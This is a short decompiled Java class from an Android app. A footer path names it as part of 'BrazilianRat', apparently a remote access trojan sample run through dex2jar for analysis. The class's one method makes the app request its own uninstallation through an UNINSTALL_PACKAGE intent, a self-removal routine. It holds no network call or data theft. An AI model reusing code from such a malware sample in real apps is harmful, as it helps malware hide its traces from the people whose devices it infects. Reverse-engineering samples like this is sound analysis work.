package com.irifix;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;

public class k {
  private static boolean a = false;
  
  public static void a(Context paramContext) {
    a = true;
    Intent intent = new Intent("android.intent.action.UNINSTALL_PACKAGE");
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append("package:");
    stringBuilder.append(paramContext.getPackageName());
    intent.setData(Uri.parse(stringBuilder.toString()));
    intent.addFlags(268435456);
    intent.addFlags(32768);
    intent.addFlags(8388608);
    paramContext.startActivity(intent);
  }
  
  public static boolean a() {
    return a;
  }
}


/* Location:              /home/fahim/Desktop/BrazilianRat-dex2jar.jar!/com/irifix/k.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */